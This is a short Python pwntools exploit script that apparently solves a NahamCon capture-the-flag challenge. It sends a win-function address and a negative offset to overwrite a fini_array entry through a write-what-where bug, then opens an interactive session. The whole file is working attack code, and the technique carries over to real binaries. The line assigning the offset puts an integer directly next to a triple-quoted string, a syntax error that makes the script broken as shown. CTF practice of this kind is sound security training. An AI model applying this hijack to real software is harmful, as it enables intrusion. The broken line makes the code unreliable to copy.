#!/usr/bin/env python3
import sys
from pwn import *


win_addr = 4198921 # 0x0401209
write_to = -616 ''' address of fini_arrray_addr_entry - base addr 
                 --> 0x04031c8 - 0x0403430 = 0xfffffffffffffd98 (-616)  
                '''
conn = remote('challenge.nahamcon.com', 30297)
#conn = process('detour')
print(conn.recvuntil(b'What: '))
conn.sendline(bytes(str(win_addr), 'utf-8'))
print(conn.recvuntil(b'Where: '))
conn.sendline(bytes(str(write_to), 'utf-8'))
print(write_to)
conn.interactive()
